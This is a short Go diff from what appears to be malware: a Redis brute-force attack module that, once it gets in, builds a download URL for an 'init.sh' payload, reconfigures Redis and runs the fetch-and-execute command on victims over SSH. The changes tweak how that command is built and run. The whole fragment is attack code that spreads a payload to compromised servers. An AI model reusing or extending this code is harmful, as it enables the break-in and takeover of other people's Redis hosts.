@@ -84,7 +84,7 @@ func (rba *RedisBruteforceAttack) doSSHAttack(redisClient *redis.RedisClient, ip
 				return err
 			}
 
-			sshClient.RunCmd(cmd)
+			sshClient.RunCmd(cmd+" true")
 
 			sshClient.Close()
 
@@ -127,7 +127,7 @@ func (rba *RedisBruteforceAttack) doAttack(redisClient *redis.RedisClient, ip st
 
 	initUrl := rba.attackTasks.DownloadInitUrl(ip, port, RedisBruteForceAttackType, "init.sh")
 
-	cmd := rba.attackTasks.InitCmdForLinux(initUrl)
+	cmd := rba.attackTasks.InitCmdForLinux(initUrl,RedisBruteForceAttackType)
 
 	redisClient.ConfigSet("stop-writes-on-bgsave-error", "no")
 	redisClient.SlaveOfNoOne()
